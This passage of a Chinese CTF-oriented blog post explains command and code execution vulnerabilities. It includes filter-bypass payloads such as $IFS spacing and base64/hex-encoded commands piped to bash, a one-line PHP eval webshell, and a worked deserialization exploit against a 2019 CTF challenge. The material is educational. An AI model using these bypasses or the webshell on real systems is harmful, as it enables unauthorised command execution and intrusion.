+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">command1 &gt; output.txt</span><br><span class="line">&gt;：将结果输出到文件中，该文件原有内容会被删除</span><br><span class="line">command2 &lt; input.txt</span><br><span class="line">&lt;：从文件读取输入作为命令的参数（但通常会直接省略，例如：cat &lt; 1.txt我们可以直接写成cat 1.txt，此时我们没有明确指定输入来源时，命令默认会从标准输入（stdin）读取数据）</span><br><span class="line">command3 &gt;&gt; log.txt</span><br><span class="line">&gt;&gt;：命令的输出追加到文件末尾，而不是覆盖文件</span><br><span class="line">command4 &lt;&lt; 分隔符</span><br><span class="line">&lt;&lt;：一段文本或一个文件的内容重定向为命令的输入，直至遇到分隔符（可以是任何字符串，例如：cat &lt;&lt; EOF</span><br><span class="line">This is the first line of text.</span><br><span class="line">This is the second line of text.</span><br><span class="line">EOF）</span><br></pre></td></tr></table></figure>
+
+<p><strong>转义符号\（Linux）^（Windows）</strong></p>
+<p><strong>命令绕过空格：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9（$后可以接任意数字，始终为空字符）、&#123;IFS&#125;、$IFS、$&#123;IFS&#125;、$IFS$1、IFS</span><br><span class="line">&lt; 、&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20  (space)</span><br><span class="line">%09  (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X （也可以用\x20）</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令绕过读文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">例如，cat被禁用，我们可以替换成：</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似，可以PGUP,PGON翻页</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line"></span><br><span class="line">或者在cat，flag中间某个位置添加\、&#x27;&#x27;、&quot;&quot;的特殊字符绕过</span><br><span class="line">添加$1、$2等、$@、$&#123;1&#125;等进行空变量绕过</span><br><span class="line">添加$a,$b这样的未初始化的变量（值为NULL）在末尾进行绕过（cat$a flag$a）</span><br><span class="line"></span><br><span class="line">变量拼接：</span><br><span class="line">if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">贪婪匹配，这里是看flag是否按顺序出现过</span><br><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br><span class="line">a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>通配符绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*    匹配全部字符（*.txt匹配所有扩展名为.txt的文件）</span><br><span class="line">?    任意一个字符（le?.txt匹配le1.txt、leA.txt 等）</span><br><span class="line">[]   表示一个范围（[abc] 匹配 a、b、c中的任意一个字符）</span><br><span class="line">&#123;&#125;   产生一个序列（a&#123;3&#125;：表示字符a连续出现三次，将匹配aaa；a&#123;2,&#125;：表示字符a连续出现至少两次，将匹配 aa、aaa、aaaa等</span><br><span class="line">     a&#123;2,4&#125;：表示字符a连续出现的次数在2到4次之间，包括2次和4次，将匹配 aa、aaa、aaaa）</span><br></pre></td></tr></table></figure>
+
+<p><strong>编码绕过</strong></p>
+<p>base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWc=|base64 -d|bash</span><br><span class="line">Y2F0IGZsYWc=是cat flag的base64编码;-d表示解码操作;bash是Linux的命令解释器</span><br><span class="line">如果bash被过滤可用sh</span><br></pre></td></tr></table></figure>
+
+<p>hex</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo 63617420666c6167|xxd -r -p|bash</span><br><span class="line">xxd 是一个十六进制转义序列的工具，通常用于将二进制文件转换为十六进制表示，或者反过来      </span><br><span class="line">-r 进行反向转换，即从十六进制转换回二进制</span><br><span class="line">-p 以十六进制字节对的原始形式输出，而不是以可打印的ASCII字符形式输出</span><br></pre></td></tr></table></figure>
+
+<p>8进制、unicode编码……</p>
+<p><strong>内联执行（反引号&#96;&#96;绕过）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9`ls`</span><br><span class="line">将反引号内命令的输出作为输入执行（`命令`和$(命令)都是执行命令的方式）</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过长度限制（利用重定向符号&gt;、&gt;&gt;）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ca\\&quot;&gt;shell</span><br><span class="line">echo &quot;t\\&quot;&gt;&gt;shell</span><br><span class="line">echo &quot; fl\\&quot;&gt;&gt;shell</span><br><span class="line">echo &quot;ag&quot;&gt;&gt;shell</span><br><span class="line"></span><br><span class="line">cat shell</span><br><span class="line">ca\</span><br><span class="line">t\</span><br><span class="line">fl\</span><br><span class="line">ag</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-MSF"><a href="#5-MSF" class="headerlink" title="5.MSF"></a>5.MSF</h3><p>Metasploit Framework 对于漏洞的利用（永恒之蓝造成的RCE）……</p>
+<p>msf中有很多漏洞模块，当我们想知道目标系统是否存在该漏洞时，就可以用对应的exploit模块可以用来验证和利用这个漏洞</p>
+<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><h3 id="1-eval"><a href="#1-eval" class="headerlink" title="1.eval"></a>1.eval</h3><p>可以接受一个包含PHP代码的字符串作为参数，并像在PHP脚本中一样执行这段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;quar&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">@ 符号是 PHP 的错误抑制操作符</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-assert"><a href="#2-assert" class="headerlink" title="2.assert"></a>2.assert</h3><p>用于执行一个断言。它接受两个参数：第一个参数是要验证的表达式，第二个参数是当表达式为假时显示的错误消息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert($value &gt; 0, &#x27;Value must be greater than zero&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3.preg_replace"></a>3.<strong>preg_replace</strong></h3><p>这个函数用于执行正则表达式搜索和替换。它接受三个参数：第一个参数是正则表达式模式，第二个参数是用于替换的字符串或数组，第三个参数是要搜索和替换的原始字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &#x27;/[a-z]/&#x27;;     匹配从a到z的任何单个字符</span><br><span class="line">$replacement = &#x27;X&#x27;;</span><br><span class="line">$subject = &#x27;abc&#x27;;</span><br><span class="line">$result = preg_replace($pattern, $replacement, $subject); </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/46b9/1.png" alt="image-20240316200023380"></p>
+<h3 id="4-call-user-func"><a href="#4-call-user-func" class="headerlink" title="4.call_user_func"></a>4.<strong>call_user_func</strong></h3><p>接受一个回调函数作为第一个参数，然后执行它，可以传递任意数量的额外参数给回调函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func (callable $callback ,mixed $parameter)</span><br><span class="line">$callback:调用的回调函数的名称，或者是一个包含对象引用和方法名的数组</span><br><span class="line">$parameter：这是传递给回调函数的一个或多个参数</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/undefined/46b9/2.png" alt="image-20240316200138761"></p>
+<h3 id="5-反序列化"><a href="#5-反序列化" class="headerlink" title="5.反序列化"></a>5.反序列化</h3><p><strong>序列化</strong>：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p>
+<p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
+<p><strong>漏洞原理：</strong></p>
+<p>在Python和PHP中，一般通过构造一个包含魔术方法（在发生特定事件或场景时被自动调用的函数，通常是构造函数或析构函数）的类，然后在魔术方法中调用命令执行或代码执行函数，接着实例化这个类的一个对象并将该对象序列化后传递给程序，当程序反序列化该对象时触发魔术方法从而执行命令或代码。在Java中没有魔术方法，但是有反射（reflection）机制，在程序的运行状态中，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法，这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。一般利用反射机制来构造一个执行命令的对象或直接调用一个具有命令执行或代码执行功能的方法实现任意代码执行</p>
+<p>[极客大挑战 2019]PHP</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"> </span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">这是根据源码进行的序列化过程最后输出</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br><span class="line"></span><br><span class="line">在PHP序列化格式中，o 表示序列化的数据是一个对象，s 表示字符串值，而数字（如 14 和 5）表示字符串的长度。冒号 : 用于分隔键名和值。在这个例子中：</span><br><span class="line">O:4:&quot;Name&quot; 表示一个对象，类名为 Name，对象的大小（或者说属性数量）为4。</span><br><span class="line">s:14:&quot;Nameusername&quot; 表示一个属性名，长度为14个字符，属性名是 &quot;Nameusername&quot;。</span><br><span class="line">s:5:&quot;admin&quot; 表示属性 &quot;Nameusername&quot; 的值是一个长度为5的字符串，即 &quot;admin&quot;。</span><br><span class="line">s:14:&quot;Namepassword&quot; 表示另一个属性名，长度为14个字符，属性名是 &quot;Namepassword&quot;。</span><br><span class="line">i:100; 表示属性 &quot;Namepassword&quot; 的值是一个整数，即 100</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP中常用魔术方法"><a href="#PHP中常用魔术方法" class="headerlink" title="PHP中常用魔术方法"></a>PHP中常用魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__construct：当对象被创建时调用</span><br><span class="line">__destruct：当对象被销毁前调用</span><br><span class="line">__sleep：执行serialize函数前调用</span><br><span class="line">__wakeup：执行unserialize函数前调用</span><br><span class="line">__call：在对象中调用不可访问的方法时调用</span><br><span class="line">__callStatic：用静态方法调用不可访问方法时调用</span><br><span class="line">__get：获得类成因变量时调用</span><br><span class="line">__set：设置类成员变量时调用</span><br></pre></td></tr></table></figure>
+
+<p>PHP中序列化后的数据中并没有像Python一样包含函数<code>__construct</code>和<code>print</code>的信息，而仅仅是类名和成员变量的信息。因此，在<code>unserialize</code>函数的参数可控的情况下，还需要代码中包含魔术方法才能利用反序列化漏洞</p>
+<p>于是我们将参数值给select，这时候问题来了，在反序列化的时候会首先执行<code>__wakeup()</code>魔术方法，但是这个方法会把我们</p>
+<p>的username重新赋值，所以我们要考虑的就是怎么跳过<code>__wakeup()</code>，而去执行<code>__destruct</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然而，PHP的反序列化机制存在一个逻辑检查，用于确保序列化字符串中的属性数量与实际类中定义的属性数量相匹配。如果在序列化字符串中声明的属性数量多于实际类中定义的属性数量，PHP会认为序列化数据可能不完整或者格式不正确，因此会跳过__wakeup()方法的调用。这样做是为了防止潜在的错误或者不可预测的行为，因为如果序列化数据不准确，__wakeup()方法中的代码可能会尝试访问不存在的属性，导致错误或者异常</span><br></pre></td></tr></table></figure>
+
+<p><strong>处理私有属性</strong>：在PHP中，私有属性（使用<code>private</code>关键字声明）在序列化时，其类名和属性名前会被加上<code>\0</code>前缀。攻击者在构造序列化字符串时，也必须包含这些前缀，以确保私有属性被正确处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://quarter77.github.io">Qu4rt3r77</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://quarter77.github.io/undefined/46b9/">https://quarter77.github.io/undefined/46b9/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://quarter77.github.io" target="_blank">晚城的海岸线</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/RCE/">RCE</a></div><div class="post_share"><div class="social-share" data-image="/img/2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/undefined/f8b7/" title="SQL注入（完善中...）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入（完善中...）</div></div></a></div><div class="next-post pull-right"><a href="/undefined/bf39/" title="Python-Flask（完善中...）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Python-Flask（完善中...）</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qu4rt3r77</div><div class="author-info__description">IT IS A LONG JOURNEY.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/quarter77" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">功能完善中... O.o</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行&amp;代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">命令执行漏洞（RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E5%B1%82%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E6%A0%BC"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.代码层过滤不严格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-escapeshellarg-escapeshellcmd-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.escapeshellarg()&#x2F;escapeshellcmd()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#escapeshellarg-%E5%87%BD%E6%95%B0%E9%80%A0%E6%88%90%E7%9A%84%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%EF%BC%88gitlist-0-6-0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">escapeshellarg()函数造成的参数注入（gitlist 0.6.0远程命令执行漏洞）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#escapeshellarg-%E5%92%8Cescapeshellcmd-%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8%E9%80%A0%E6%88%90%E7%9A%84%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">escapeshellarg()和escapeshellcmd()组合使用造成的参数注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88Bash-Shellshock%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9ECVE-2014-6271%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.系统漏洞造成命令注入（Bash Shellshock破壳漏洞CVE-2014-6271）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6%E5%8F%B7%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.命令拼接符号及一些绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-MSF"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.MSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-eval"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-assert"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.assert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-preg-replace"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.preg_replace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-call-user-func"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%B8%AD%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.6.</span> <span class="toc-text">PHP中常用魔术方法</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/undefined/bf39/" title="Python-Flask（完善中...）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python-Flask（完善中...）"/></a><div class="content"><a class="title" href="/undefined/bf39/" title="Python-Flask（完善中...）">Python-Flask（完善中...）</a><time datetime="2024-04-14T07:14:44.168Z" title="发表于 2024-04-14 